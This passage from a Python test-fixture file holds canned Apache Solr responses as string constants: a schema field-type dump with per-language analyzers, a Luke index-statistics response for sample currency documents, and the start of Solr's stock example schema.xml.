NE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_lv.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""LatvianStemFilterFactory"":{""args"":{""class"":""solr.LatvianStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.lv.LatvianStemFilterFactory""}}},""similarity"":{}},""text_nl"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_nl.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""StemmerOverrideFilterFactory"":{""args"":{""class"":""solr.StemmerOverrideFilterFactory"",""dictionary"":""lang/stemdict_nl.txt"",""ignoreCase"":""false"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.miscellaneous.StemmerOverrideFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Dutch"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_nl.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""StemmerOverrideFilterFactory"":{""args"":{""class"":""solr.StemmerOverrideFilterFactory"",""dictionary"":""lang/stemdict_nl.txt"",""ignoreCase"":""false"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.miscellaneous.StemmerOverrideFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Dutch"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""similarity"":{}},""text_no"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_no.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Norwegian"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_no.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Norwegian"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""similarity"":{}},""text_pt"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_pt.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""PortugueseLightStemFilterFactory"":{""args"":{""class"":""solr.PortugueseLightStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.pt.PortugueseLightStemFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_pt.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""PortugueseLightStemFilterFactory"":{""args"":{""class"":""solr.PortugueseLightStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.pt.PortugueseLightStemFilterFactory""}}},""similarity"":{}},""text_ro"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_ro.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Romanian"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_ro.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Romanian"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""similarity"":{}},""text_ru"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_ru.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Russian"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_ru.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Russian"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""similarity"":{}},""text_sv"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_sv.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Swedish"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_sv.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Swedish"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""similarity"":{}},""text_th"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""ThaiWordFilterFactory"":{""args"":{""class"":""solr.ThaiWordFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.th.ThaiWordFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_th.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""ThaiWordFilterFactory"":{""args"":{""class"":""solr.ThaiWordFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.th.ThaiWordFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_th.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""}}},""similarity"":{}},""text_tr"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""TurkishLowerCaseFilterFactory"":{""args"":{""class"":""solr.TurkishLowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.tr.TurkishLowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_tr.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""false"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Turkish"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""TurkishLowerCaseFilterFactory"":{""args"":{""class"":""solr.TurkishLowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.tr.TurkishLowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_tr.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""false"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Turkish"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""similarity"":{}},""text_ws"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.core.WhitespaceTokenizerFactory"",""args"":{""class"":""solr.WhitespaceTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.core.WhitespaceTokenizerFactory"",""args"":{""class"":""solr.WhitespaceTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}}},""similarity"":{}},""tfloat"":{""fields"":[""*_tf""],""tokenized"":true,""className"":""org.apache.solr.schema.TrieFloatField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.solr.analysis.TrieTokenizerFactory"",""args"":{}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.solr.analysis.TrieTokenizerFactory"",""args"":{}}},""similarity"":{}},""tint"":{""fields"":[""*_ti""],""tokenized"":true,""className"":""org.apache.solr.schema.TrieIntField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.solr.analysis.TrieTokenizerFactory"",""args"":{}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.solr.analysis.TrieTokenizerFactory"",""args"":{}}},""similarity"":{}},""tlong"":{""fields"":[""*_tl""],""tokenized"":true,""className"":""org.apache.solr.schema.TrieLongField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.solr.analysis.TrieTokenizerFactory"",""args"":{}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.solr.analysis.TrieTokenizerFactory"",""args"":{}}},""similarity"":{}}}},""info"":{""key"":{""I"":""Indexed"",""T"":""Tokenized"",""S"":""Stored"",""D"":""DocValues"",""M"":""Multivalued"",""V"":""TermVector Stored"",""o"":""Store Offset With TermVector"",""p"":""Store Position With TermVector"",""O"":""Omit Norms"",""F"":""Omit Term Frequencies & Positions"",""P"":""Omit Positions"",""H"":""Store Offsets with Positions"",""L"":""Lazy"",""B"":""Binary"",""f"":""Sort Missing First"",""l"":""Sort Missing Last""},""NOTE"":""Document Frequency (df) is not updated when a document is marked for deletion.  df values include deleted documents.""}}""""""

SOLR_LUKE_ = """"""{""responseHeader"":{""status"":0,""QTime"":5},""index"":{""numDocs"":8,""maxDoc"":8,""deletedDocs"":0,""version"":15,""segmentCount"":5,""current"":true,""hasDeletions"":false,""directory"":""org.apache.lucene.store.NRTCachingDirectory:NRTCachingDirectory(org.apache.solr.store.hdfs.HdfsDirectory@5efe087b lockFactory=org.apache.solr.store.hdfs.HdfsLockFactory@5106def2; maxCacheMB=192.0 maxMergeSizeMB=16.0)"",""userData"":{""commitTimeMSec"":""1389233070579""},""lastModified"":""2014-01-09T02:04:30.579Z""},""fields"":{""_version_"":{""type"":""long"",""schema"":""ITS-----OF------"",""index"":""-TS-------------"",""docs"":8,""distinct"":8,""topTerms"":[""1456716393276768256"",1,""1456716398067712000"",1,""1456716401465098240"",1,""1460689159964327936"",1,""1460689159981105152"",1,""1460689159988445184"",1,""1460689159993688064"",1,""1456716273606983680"",1],""histogram"":[""1"",8]},""cat"":{""type"":""string"",""schema"":""I-S-M---OF-----l"",""index"":""ITS-----OF------"",""docs"":4,""distinct"":1,""topTerms"":[""currency"",4],""histogram"":[""1"",0,""2"",0,""4"",1]},""features"":{""type"":""text_general"",""schema"":""ITS-M-----------"",""index"":""ITS-------------"",""docs"":4,""distinct"":3,""topTerms"":[""coins"",4,""notes"",4,""and"",4],""histogram"":[""1"",0,""2"",0,""4"",3]},""id"":{""type"":""string"",""schema"":""I-S-----OF-----l"",""index"":""ITS-----OF------"",""docs"":8,""distinct"":8,""topTerms"":[""GBP"",1,""NOK"",1,""USD"",1,""change.me"",1,""change.me1"",1,""change.me112"",1,""change.me12"",1,""EUR"",1],""histogram"":[""1"",8]},""inStock"":{""type"":""boolean"",""schema"":""I-S-----OF-----l"",""index"":""ITS-----OF------"",""docs"":4,""distinct"":1,""topTerms"":[""true"",4],""histogram"":[""1"",0,""2"",0,""4"",1]},""manu"":{""type"":""text_general"",""schema"":""ITS-----O-------"",""index"":""ITS-----O-------"",""docs"":4,""distinct"":7,""topTerms"":[""of"",2,""bank"",2,""european"",1,""norway"",1,""u.k"",1,""union"",1,""america"",1],""histogram"":[""1"",5,""2"",2]},""manu_exact"":{""type"":""string"",""schema"":""I-------OF-----l"",""index"":""(unstored field)"",""docs"":4,""distinct"":4,""topTerms"":[""Bank of Norway"",1,""European Union"",1,""U.K."",1,""Bank of America"",1],""histogram"":[""1"",4]},""manu_id_s"":{""type"":""string"",""schema"":""I-S-----OF-----l"",""dynamicBase"":""*_s"",""index"":""ITS-----OF------"",""docs"":4,""distinct"":4,""topTerms"":[""eu"",1,""nor"",1,""uk"",1,""boa"",1],""histogram"":[""1"",4]},""name"":{""type"":""text_general"",""schema"":""ITS-------------"",""index"":""ITS-------------"",""docs"":4,""distinct"":6,""topTerms"":[""one"",4,""euro"",1,""krone"",1,""dollar"",1,""pound"",1,""british"",1],""histogram"":[""1"",5,""2"",0,""4"",1]},""price_c"":{""type"":""currency"",""schema"":""I-S------F------"",""dynamicBase"":""*_c""},""price_c____amount_raw"":{""type"":""amount_raw_type_tlong"",""schema"":""IT------O-------"",""dynamicBase"":""*____amount_raw"",""index"":""(unstored field)"",""docs"":4,""distinct"":8,""topTerms"":[""0"",4,""0"",4,""0"",4,""0"",4,""0"",4,""0"",4,""0"",4,""100"",4],""histogram"":[""1"",0,""2"",0,""4"",8]},""price_c____currency"":{""type"":""currency_type_string"",""schema"":""I-------O-------"",""dynamicBase"":""*____currency"",""index"":""(unstored field)"",""docs"":4,""distinct"":4,""topTerms"":[""GBP"",1,""NOK"",1,""USD"",1,""EUR"",1],""histogram"":[""1"",4]},""romain_t"":{""type"":""text_general"",""schema"":""ITS-------------"",""dynamicBase"":""*_t"",""index"":""ITS-------------"",""docs"":1,""distinct"":1,""topTerms"":[""true"",1],""histogram"":[""1"",1]},""text"":{""type"":""text_general"",""schema"":""IT--M-----------"",""index"":""(unstored field)"",""docs"":8,""distinct"":21,""topTerms"":[""and"",4,""currency"",4,""notes"",4,""one"",4,""coins"",4,""bank"",2,""of"",2,""change.me112"",1,""change.me1"",1,""change.me"",1],""histogram"":[""1"",14,""2"",2,""4"",5]},""title"":{""type"":""text_general"",""schema"":""ITS-M-----------"",""index"":""ITS-------------"",""docs"":4,""distinct"":4,""topTerms"":[""change.me1"",1,""change.me112"",1,""change.me12"",1,""change.me"",1],""histogram"":[""1"",4]}},""info"":{""key"":{""I"":""Indexed"",""T"":""Tokenized"",""S"":""Stored"",""D"":""DocValues"",""M"":""Multivalued"",""V"":""TermVector Stored"",""o"":""Store Offset With TermVector"",""p"":""Store Position With TermVector"",""O"":""Omit Norms"",""F"":""Omit Term Frequencies & Positions"",""P"":""Omit Positions"",""H"":""Store Offsets with Positions"",""L"":""Lazy"",""B"":""Binary"",""f"":""Sort Missing First"",""l"":""Sort Missing Last""},""NOTE"":""Document Frequency (df) is not updated when a document is marked for deletion.  df values include deleted documents.""}}""""""

SOLR_SCHEMA = """"""
<?xml version=""1.0"" encoding=""UTF-8"" ?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
 contributor license agreements.  See the NOTICE file distributed with
 this work for additional information regarding copyright ownership.
 The ASF licenses this file to You under the Apache License, Version 2.0
 (the ""License""); you may not use this file except in compliance with
 the License.  You may obtain a copy of the License at

     http://www.apache.org/licenses/LICENSE-2.0

 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an ""AS IS"" BASIS,
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.
-->

<!--
 This is the Solr schema file. This file should be named ""schema.xml"" and
 should be in the conf directory under the solr home
 (i.e. ./solr/conf/schema.xml by default)
 or located where the classloader for the Solr webapp can find it.

 This example schema is the recommended starting point for users.
 It should be kept correct and concise, usable out-of-the-box.

 For more information, on how to customize this file, please see
 http://wiki.apache.org/solr/SchemaXml

 PERFORMANCE NOTE: this schema includes many optional features and should not
 be used for benchmarking.  To improve performance one could
  - set stored=""false"" for all fields possible (esp large fields) when you
    only need to search on the field but don't need to return the original
    value.
  - set indexed=""false"" if you don't need to search on the field, but only
    return the field as a result of searching on other indexed fields.
  - remove all unneeded copyField statements
  - for best index size and searching performance, set ""index"" to false
    for all general text fields, use copyField to copy them to the
    catchall ""text"" field, and use that for searching.
  - For maximum indexing performance, use the StreamingUpdateSolrServer
    java client.
  - Remember to run the JVM in server mode, and use a higher logging level
    that avoids logging every request
-->

<schema name=""example"" version=""1.5"">
  <!-- attribute ""name"" is the name of this schema and is only used for display purposes.
       version=""x.y"" is Solr's version number for the schema syntax and
       semantics.  It should not normally be changed by applications.

       1.0: multiValued attribute did not exist, all fields are multiValued
            by nature
       1.1: multiValued attribute introduced, false by default
       1.2: omitTermFreqAndPositions attribute introduced, true by default
            except for text fields.
       1.3: removed optional field compress feature
       1.4: autoGeneratePhraseQueries attribute introduced to drive QueryParser
            behavior when a single string produces multiple tokens.  Defaults
            to off for version >= 1.4
       1.5: omitNorms defaults to true for primitive field types
            (int, float, boolean, string...)
     -->

 <fields>
   <!-- Valid attributes for fields:
     name: mandatory - the name for the field
     type: mandatory - the name of a field type from the
       <types> fieldType section
     indexed: true if this field should be indexed (searchable or sortable)
     stored: true if this field should be retrievable
     docValues: true if this field should have doc values. Doc values are
       useful for faceting, grouping, sorting and function queries. Although not
       required, doc values will make the index faster to load, more
       NRT-friendly and more memory-efficient. They however come with some
       limitations: they are currently only supported by StrField, UUIDField
       and all Trie*Fields, and depending on the field type, they might
       require the field to be single-valued, be required or have a default
       value (check the documentation of the field type you're interested in
       for more information)
     multiValued: true if this field may contain multiple values per document
     omitNorms: (expert) set to true to omit the norms associated with
       this field (this disables length normalization and index-time
       boosting for the field, and saves some memory).  Only full-text
       fields or fields that need an index-time boost need norms.
       Norms are omitted for primitive (non-analyzed) types by default.
     termVectors: [false] set to true to store the term vector for a
       given field.
       When using MoreLikeThis, fields used for similarity should be
       stored for best performance.
     termPositions: Store position information with the term vector.
       This will increase storage costs.
     termOffsets: Store offset information with the term vector. This
       will increase storage costs.
     required: The field is required.  It will throw an error if the
       value does not exist
     default: a value that should be used if no value is specified
       when adding a document.
   -->

   <!-- field names should consist of alphanumeric or underscore characters only and
      not start with a digit.  This is not currently strictly enforced,
      but other field names will not have first class support from all components
      and back compatibility is not guaranteed.  Names with both leading and
      trailing underscores (e.g. _version_) are reserved.
   -->

   <field name=""id"" type=""string"" indexed=""true"" stored=""true"" required=""true"" multiValued=""false"" />
   <field name=""sku"" type=""text_en_splitting_tight"" indexed=""true"" stored=""true"" omitNorms=""true""/>
   <field name=""name"" type=""text_general"" indexed=""true"" stored=""true""/>
   <field name=""manu"" type=""text_general"" indexed=""true"" stored=""true"" omitNorms=""true""/>
   <field name=""cat"" type=""string"" indexed=""true"" stored=""true"" multiValued=""true""/>
   <field name=""features"" type=""text_general"" indexed=""true"" stored=""true"" multiValued=""true""/>
   <field name=""includes"" type=""text_general"" indexed=""true"" stored=""true"" termVectors=""true"" termPositions=""true"" termOffsets=""true"" />

   <field name=""weight"" type=""float"" indexed=""true"" stored=""true""/>
   <field name=""price""  type=""float"" indexed=""true"" stored=""true""/>
   <field name=""popularity"" type=""int"" indexed=""true"" stored=""true"" />
   <field name=""inStock"" type=""boolean"" indexed=""true"" stored=""true"" />

   <field name=""store"" type=""location"" indexed=""true"" stored=""true""/>

   <!-- Common metadata fields, named specifically to match up with
     SolrCell metadata when parsing rich documents such as Word, PDF.
     Some fields are multiValued only because Tika currently may return
     multiple values for them. Some metadata is parsed from the documents,
     but there are some which come from the client context:
       ""content_type"": From the HTTP headers of incoming stream
       ""resourcename"": From SolrCell request param resource.name
   -->
   <field name=""title"" type=""text_general"" indexed=""true"" stored=""true"" multiValued=""true""/>
   <field name=""subject"" type=""text_general"" indexed=""true"" stored=""true""/>
   <field name=""description"" type=""text_general"" indexed=""true"" stored=""true""/>
